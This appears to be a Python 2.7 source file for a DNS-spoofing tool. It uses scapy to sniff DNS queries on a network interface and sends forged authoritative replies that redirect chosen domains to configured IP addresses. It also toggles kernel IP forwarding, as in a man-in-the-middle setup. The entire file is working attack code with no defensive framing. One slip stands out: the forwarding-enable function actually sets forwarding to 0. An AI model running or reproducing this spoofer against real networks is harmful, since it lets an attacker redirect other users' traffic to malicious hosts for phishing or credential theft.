#!/usr/bin/python2.7 
 
import sys, time 
import DNSConf
from scapy.all import * 
from multiprocessing import Process
from subprocess import call
 
class DNSSniffer(Process): 
  def __init__(self, i, conf):
    super(DNSSniffer, self).__init__()
    self.counter = 1
    self.interface = i
    self.enableIpForwarding()
    self.conf = conf

  def __del__(self):
    self.disableIpForwarding()
  
  def run(self):
    while(True):
      sniff(iface = self.interface, filter = 'udp port 53', prn = self.cb) 
  
  def stop(self): 
    #self.e.set() 
    print " -- Stopping DNSSniff" 
   
  def cb(self, pkt):
    if pkt.haslayer(DNSQR) and pkt.getlayer(DNS).an == None:
      self.counter += 1
      if (pkt.getlayer(DNS).qd.qname in self.conf.getDomains()):
        send(IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
            UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
            DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
            an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=self.conf.getIPFromDomain(pkt.getlayer(DNS).qd.qname))))
        return ('#{}: {} ==> {} @({}) Answered IP:{}'.format(self.counter, pkt[IP].src, pkt[IP].dst, pkt.getlayer(DNS).qd.qname, self.conf.getIPFromDomain(pkt.getlayer(DNS).qd.qname)))
      return ('#{}: {} ==> {} @({})'.format(self.counter, pkt[IP].src, pkt[IP].dst, pkt.getlayer(DNS).qd.qname))
      
  def enableIpForwarding(self):
    call(["sysctl", "-w", "net.ipv4.ip_forward=0"])

  def disableIpForwarding(self):
    call(["sysctl", "-w", "net.ipv4.ip_forward=0"])
